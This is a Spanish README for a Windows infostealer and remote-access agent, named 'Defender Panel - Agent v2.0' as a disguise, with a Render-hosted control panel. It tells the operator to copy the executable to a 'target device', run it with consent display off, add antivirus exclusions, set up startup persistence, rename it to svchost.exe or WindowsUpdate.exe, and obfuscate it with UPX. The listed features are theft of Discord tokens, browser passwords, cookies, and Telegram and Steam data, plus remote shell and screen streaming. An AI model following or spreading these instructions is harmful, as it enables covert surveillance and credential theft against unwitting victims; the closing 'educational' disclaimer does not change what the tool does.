╔═══════════════════════════════════════════════════════════╗
║         DEFENDER PANEL - AGENT v2.0                       ║
║         https://iisias93djan3df32r.onrender.com          ║
╚═══════════════════════════════════════════════════════════╝

📦 CONTENIDO:
  - defender-agent.exe    (Agente compilado)
  - config.json           (Configuración del servidor)
  - README.txt            (Este archivo)

🚀 INSTRUCCIONES DE USO:

1. COPIAR ARCHIVOS:
   - Copia ambos archivos al dispositivo objetivo:
     * defender-agent.exe
     * config.json

2. EJECUTAR:
   - Doble click en defender-agent.exe
   - O desde CMD/PowerShell:
     .\defender-agent.exe

3. VERIFICAR CONEXIÓN:
   - Ve al panel: https://iisias93djan3df32r.onrender.com
   - Login: admin / admin
   - El dispositivo aparecerá en "Dispositivos" (en verde si está online)

⚙️ CONFIGURACIÓN:

El archivo config.json contiene:
{
  "serverUrl": "https://iisias93djan3df32r.onrender.com",
  "heartbeatInterval": 15000,
  "showConsent": false
}

Para cambiar el servidor, edita "serverUrl" y recompila.

🔥 CARACTERÍSTICAS:

✅ Tokens de Discord (todas las versiones)
✅ Contraseñas de navegadores (v10/v11)
✅ Cookies (Chrome, Edge, Brave, Opera)
✅ Control remoto completo
✅ Terminal PowerShell
✅ Explorador de archivos
✅ Captura de pantalla
✅ Screen streaming (2-10 FPS)
✅ Task manager
✅ Historial de navegadores
✅ Datos de aplicaciones (Telegram, Steam)

⚠️ NOTAS IMPORTANTES:

1. ANTIVIRUS:
   - Algunos antivirus pueden detectar el agente
   - Añade excepción si es necesario
   - Windows Defender: Protección en tiempo real → Exclusiones

2. FIREWALL:
   - El agente necesita acceso a internet
   - Puerto saliente: 443 (HTTPS)

3. PERSISTENCIA:
   - El agente NO se instala como servicio
   - Para inicio automático, añade a:
     shell:startup (C:\Users\USER\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup)

4. RENDER.COM:
   - El servidor se duerme tras 15 min de inactividad
   - Primera conexión puede tardar 30 segundos
   - Para 24/7 activo: upgrade a plan pago ($7/mes)

📊 REQUISITOS:

- Windows 10/11 (x64)
- Conexión a internet
- Sin instalaciones adicionales (todo incluido en el .exe)

🔐 SEGURIDAD:

- Comunicación via WebSocket (wss://)
- Autenticación JWT en el panel
- Datos encriptados en tránsito

💡 TIPS:

1. RENOMBRAR:
   - Puedes renombrar "defender-agent.exe" a algo discreto:
     * svchost.exe
     * update.exe
     * WindowsUpdate.exe

2. ICONO:
   - Usa herramientas como Resource Hacker para cambiar icono

3. OFUSCAR:
   - Usa UPX o similar para comprimir/ofuscar el exe

🆘 SOPORTE:

- Panel web: https://iisias93djan3df32r.onrender.com
- GitHub: https://github.com/arcenaltonto-creator/IISIAS93DJAN3DF32R

📝 CHANGELOG:

v2.0 (Actual)
- ✅ Extracción completa de tokens Discord
- ✅ Soporte v10/v11 passwords
- ✅ Detección v20 (App-Bound Encryption)
- ✅ Multi-browser support
- ✅ Screen streaming mejorado
- ✅ Deployed en Render.com

═══════════════════════════════════════════════════════════

⚠️  DISCLAIMER LEGAL:
Este software es solo para fines educativos y pruebas autorizadas.
El uso no autorizado es ilegal. Los autores no se responsabilizan
del mal uso de esta herramienta.

═══════════════════════════════════════════════════════════
